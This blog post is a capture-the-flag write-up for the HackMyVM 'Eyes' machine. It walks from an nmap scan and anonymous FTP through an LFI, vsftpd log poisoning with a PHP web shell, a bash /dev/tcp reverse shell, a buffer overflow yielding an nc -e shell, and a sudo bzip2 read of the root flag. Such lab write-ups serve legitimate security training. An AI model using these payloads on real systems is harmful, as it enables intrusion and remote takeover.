---
layout: post
author: maxin
title:  "Eyes"
date:   2022-01-01 10:39:32 PM -03
category: HackMyVM
tags: Writeup
---

[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Eyes)

# Enumeration

{% highlight text  %}
# Nmap 7.92 scan initiated Thu Dec 30 20:14:26 2021 as: nmap -sC -sV -v -oN nmap 192.168.0.217
Nmap scan report for 192.168.0.217
Host is up (0.016s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             125 Apr 04  2021 index.php
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.216
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b1:12:94:12:60:67:e1:0b:45:c1:8d:e9:21:13:bc:51 (RSA)
|   256 b7:7f:25:94:d6:4e:88:56:8a:22:34:16:c2:de:ba:02 (ECDSA)
|_  256 30:c7:a2:90:39:5d:24:13:bf:aa:ba:4c:a7:f4:2f:bb (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 20:14:35 2021 -- 1 IP address (1 host up) scanned in 8.99 seconds
{% endhighlight  %}

# FTP

Connect to FTP using the default creds `anonymous` and blank password

Get index.php, we can see it’s a LFI. 

{% highlight php  %}
<?php
$file = $_GET['fil3'];
if(isset($file)) {
	include($file);
} else {
	print("Here my eyes...");
}
?>
<!--Monica's eyes-->
{% endhighlight  %}

# Log Poisoning

Testing the LFI, we have access to vsftpd logs `/index.php?fil3=/var/log/vsftpd.log`

We can poison this log with a malicious payload and get RCE 

## LFI → RCE

Go back to FTP

![Untitled](/images/eyes/ftp.png)

{% highlight php  %}
<?php $cmd=$_GET['cmd'];system($cmd); ?>
{% endhighlight  %}

Go back to webserver and use the `cmd` parameter to do a reverse shell

## Reverse shell

{% highlight bash  %}
http://$IP/index.php?fil3=/var/log/vsftpd.log&cmd=bash -c 'bash -i >& /dev/tcp/$KaliIP/$PORT 0>&1'
{% endhighlight  %}

`Note:` If you having trouble with reverse shell, send this payload above to burp and encode with URL-Encode

# User

On `/opt` directory have a C script

{% highlight c  %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>

int main(void) {
 char command[100];
 char ls[50]="/usr/bin/ls";
 char name[50];
 printf("Enter your name:");
 gets(name);
 strcpy(command,ls);
 setuid(1000);
 setgid(1000);
 printf("Hi %s, Im executing ls\n Output:\n",name);
 system(command);
}
{% endhighlight  %}

This code it’s vulnerable to Buffer Overflow. Buffer the `name` variable, we can overwrite the `ls`variable and inject whatever command we want.

{% highlight bash  %}
python3 -c 'print("a"*64 + "/usr/bin/nc $KaliIP 1000 -e /bin/bash")' | ./ls
{% endhighlight  %}

Sending 64 characters to `name` we can start to overwrite `ls` variable and send nc command to our machine 

# Root

{% highlight bash  %}
sudo -l

User monica may run the following commands on eyes:
    (ALL) NOPASSWD: /usr/bin/bzip2
{% endhighlight  %}

{% highlight bash  %}
sudo bzip2 -c /root/root.txt | bzip2 -d
{% endhighlight  %}